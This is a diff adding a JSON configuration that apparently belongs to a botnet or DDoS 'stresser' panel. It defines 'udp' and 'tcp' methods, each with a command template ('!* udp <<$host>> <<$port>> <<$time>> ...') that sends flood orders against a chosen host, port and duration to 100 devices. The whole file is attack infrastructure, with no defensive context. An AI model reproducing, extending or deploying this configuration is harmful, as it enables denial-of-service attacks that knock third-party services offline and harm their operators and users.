@@ -1,0 +1,17 @@
+{
+        "enabled":true,
+        "port":181,
+        "methods":[
+            {
+                "name":"udp",
+                "command":"!* udp <<$host>> <<$port>> <<$time>> 1024 1",
+                "devices":100
+            },
+            {
+                "name":"tcp",
+                "command":"!* tcp <<$host>> <<$port>> <<$time>>",
+                "devices":100
+            }
+
+        ]
+    }
